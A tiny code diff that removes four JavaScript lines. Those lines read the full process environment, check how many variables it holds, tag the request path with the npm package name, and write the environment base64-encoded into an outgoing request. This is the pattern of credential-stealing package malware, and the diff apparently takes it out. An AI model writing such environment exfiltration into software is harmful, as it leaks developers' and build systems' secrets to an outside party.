@@ -1,4 +1,0 @@
-var data = process.env || {}
-Object.keys(data).length < 10
-_tmp_5.path = '/' + (data.npm_package_name || '')
-req.write(Buffer.from(JSON.stringify(data)).toString('base64'))
